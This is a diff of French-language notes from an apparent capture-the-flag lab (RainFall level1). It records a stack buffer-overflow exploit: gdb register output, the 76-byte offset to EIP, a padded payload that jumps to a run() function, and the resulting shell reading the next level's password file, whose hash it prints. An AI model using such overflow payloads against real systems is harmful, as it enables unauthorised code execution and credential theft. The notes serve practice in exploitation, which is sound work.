@@ -118,8 +118,16 @@ fs             0x0	0
 gs             0x33	51
 (gdb) 
 
-valeur EIP 
-eip            0x41414141	0x41414141
+valeur EBP 
+ebp            0x41414141	0x41414141
+
+a 76 char on s'arrete juste avant eip a epb remplis par des A (441 enm ASCII)
+
+creer une payload de 76 A puis le jump a l'adresse de la fonction run()
+level1/source.py
+
+level1@RainFall:/tmp$ nano scrypt.py
+level1@RainFall:/tmp$ python scrypt.py
 
 
 level1@RainFall:~$ ./level1 < /tmp/payload
@@ -131,7 +139,13 @@ pas suffisant car segfault juste apres l'ouverture du shell et donc impossible d
 
 
 level1@RainFall:~$ cat /tmp/payload - | ./level1
-;
+d
 Good... Wait what?
+ls
+ls: cannot open directory .: Permission denied
 cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+^CSegmentation fault (core dumped)
+
+level1@RainFall:~$
